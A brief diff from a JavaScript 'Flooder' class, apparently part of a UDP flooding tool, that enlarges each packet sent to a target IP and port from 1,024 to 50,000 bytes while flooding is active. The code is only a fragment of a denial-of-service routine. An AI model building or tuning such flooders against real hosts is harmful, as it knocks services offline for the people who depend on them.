@@ -21,7 +21,7 @@ module.exports = class Flooder extends events.EventEmitter {
 
     const sendOne = (ip, port) =>
       new Promise(resolve => {
-        const msg = Buffer.alloc(1024)
+        const msg = Buffer.alloc(50000)
         this.client.send(msg, port, ip, () => resolve(!this.isFlooding))
         this.emit('packet')
       })
